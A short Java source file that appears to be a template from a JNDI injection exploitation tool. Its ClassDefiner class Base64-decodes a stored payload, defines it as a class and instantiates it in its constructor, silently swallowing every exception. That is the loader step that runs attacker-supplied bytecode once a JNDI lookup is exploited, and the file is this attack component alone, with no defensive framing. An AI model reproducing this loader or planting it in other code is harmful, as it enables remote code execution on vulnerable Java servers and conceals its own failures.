package map.jndi.template;

import java.util.Base64;

public class ClassDefiner extends ClassLoader {
    private static String className;
    private static String payload;

    public ClassDefiner() {
        try {
            byte[] data = Base64.getDecoder().decode(payload);
            this.defineClass(className, data, 0, data.length).newInstance();
        } catch (Exception ignore) { }
    }
}
